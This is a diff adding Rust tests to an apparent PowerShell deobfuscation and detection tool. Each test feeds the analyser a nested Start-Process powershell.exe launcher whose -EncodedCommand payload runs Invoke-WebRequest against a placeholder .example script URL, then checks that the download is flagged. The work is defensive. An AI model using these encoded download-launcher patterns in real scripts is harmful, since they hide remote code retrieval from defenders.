@@ -11964,6 +11964,57 @@ Invoke-WebRequest -Uri $k[0] -OutFile stage.bin
     }
 
     #[test]
+    fn nested_start_process_positional_argumentlist_encodedcommand_resolves_url() {
+        let decoded = "Invoke-WebRequest https://start-positional-args.example/p.ps1";
+        let ps = format!(
+            r#"Start-Process powershell.exe '-NoP -EncodedCommand {}'"#,
+            encode_utf16(decoded)
+        );
+        let script = format!("powershell -Command \"{}\"\r\n", ps.replace('"', "\\\""));
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        | Trait::DownloadInDeobText { src, .. }
+                        if src == "https://start-positional-args.example/p.ps1"
+                )
+            }),
+            "nested Start-Process positional ArgumentList EncodedCommand URL missed: {:?}\ndeob:\n{}",
+            report.traits,
+            report.extracted_ps1_normalized.join("\n---\n")
+        );
+    }
+
+    #[test]
+    fn nested_start_process_named_filepath_positional_argumentlist_encodedcommand_resolves_url() {
+        let decoded =
+            "Invoke-WebRequest https://start-named-filepath-positional-args.example/p.ps1";
+        let ps = format!(
+            r#"Start-Process -FilePath powershell.exe '-NoP -EncodedCommand {}'"#,
+            encode_utf16(decoded)
+        );
+        let script = format!("powershell -Command \"{}\"\r\n", ps.replace('"', "\\\""));
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        | Trait::DownloadInDeobText { src, .. }
+                        if src == "https://start-named-filepath-positional-args.example/p.ps1"
+                )
+            }),
+            "nested Start-Process named FilePath positional ArgumentList EncodedCommand URL missed: {:?}\ndeob:\n{}",
+            report.traits,
+            report.extracted_ps1_normalized.join("\n---\n")
+        );
+    }
+
+    #[test]
     fn nested_start_process_argumentlist_array_encodedcommand_resolves_url() {
         let decoded = "Invoke-WebRequest https://start-arg-array.example/p.ps1";
         let ps = format!(
@@ -12039,6 +12090,31 @@ Invoke-WebRequest -Uri $k[0] -OutFile stage.bin
     }
 
     #[test]
+    fn nested_start_process_argumentlist_grouped_array_encodedcommand_resolves_url() {
+        let decoded = "Invoke-WebRequest https://start-grouped-array.example/p.ps1";
+        let ps = format!(
+            r#"Start-Process powershell.exe -ArgumentList ('-NoP', '-EncodedCommand', '{}')"#,
+            encode_utf16(decoded)
+        );
+        let script = format!("powershell -Command \"{}\"\r\n", ps.replace('"', "\\\""));
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        | Trait::DownloadInDeobText { src, .. }
+                        if src == "https://start-grouped-array.example/p.ps1"
+                )
+            }),
+            "nested Start-Process ArgumentList grouped array EncodedCommand URL missed: {:?}\ndeob:\n{}",
+            report.traits,
+            report.extracted_ps1_normalized.join("\n---\n")
+        );
+    }
+
+    #[test]
     fn nested_start_process_argumentlist_variable_array_encodedcommand_resolves_url() {
         let decoded = "Invoke-WebRequest https://start-var-array.example/p.ps1";
         let ps = format!(
@@ -12058,6 +12134,56 @@ Invoke-WebRequest -Uri $k[0] -OutFile stage.bin
                 )
             }),
             "nested Start-Process ArgumentList variable array EncodedCommand URL missed: {:?}\ndeob:\n{}",
+            report.traits,
+            report.extracted_ps1_normalized.join("\n---\n")
+        );
+    }
+
+    #[test]
+    fn nested_start_process_argumentlist_scalar_variable_encodedcommand_resolves_url() {
+        let decoded = "Invoke-WebRequest https://start-scalar-args.example/p.ps1";
+        let ps = format!(
+            r#"$args = '-NoP -EncodedCommand {}'; Start-Process powershell.exe -ArgumentList $args"#,
+            encode_utf16(decoded)
+        );
+        let script = format!("powershell -Command \"{}\"\r\n", ps.replace('"', "\\\""));
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        | Trait::DownloadInDeobText { src, .. }
+                        if src == "https://start-scalar-args.example/p.ps1"
+                )
+            }),
+            "nested Start-Process ArgumentList scalar variable EncodedCommand URL missed: {:?}\ndeob:\n{}",
+            report.traits,
+            report.extracted_ps1_normalized.join("\n---\n")
+        );
+    }
+
+    #[test]
+    fn nested_start_process_argumentlist_inline_variable_array_encodedcommand_resolves_url() {
+        let decoded = "Invoke-WebRequest https://start-inline-var-array.example/p.ps1";
+        let ps = format!(
+            r#"$a = '-NoP'; $b = '-EncodedCommand'; $c = '{}'; Start-Process powershell.exe -ArgumentList $a, $b, $c"#,
+            encode_utf16(decoded)
+        );
+        let script = format!("powershell -Command \"{}\"\r\n", ps.replace('"', "\\\""));
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        | Trait::DownloadInDeobText { src, .. }
+                        if src == "https://start-inline-var-array.example/p.ps1"
+                )
+            }),
+            "nested Start-Process ArgumentList inline variable array EncodedCommand URL missed: {:?}\ndeob:\n{}",
             report.traits,
             report.extracted_ps1_normalized.join("\n---\n")
         );
